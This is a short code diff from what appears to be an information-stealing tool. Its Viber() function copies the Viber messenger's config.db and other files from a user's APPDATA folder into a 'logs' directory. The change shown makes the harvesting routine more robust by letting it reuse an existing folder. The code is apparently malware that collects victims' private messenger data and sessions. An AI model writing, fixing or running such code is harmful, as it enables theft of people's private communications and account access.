@@ -11,7 +11,7 @@ def Viber():
             roaming = getenv('APPDATA')
             user = environ['USERPROFILE']
             pathtofile = f'{user}\\{config.pathToLogs}\\Messengers\\Viber'
-            makedirs(pathtofile)
+            makedirs(pathtofile, exist_ok=True)
             copy2(roaming+ sep + path+"/config.db",pathtofile)
             dirs = listdir(f"{roaming+sep+path}")
             for filename in dirs:
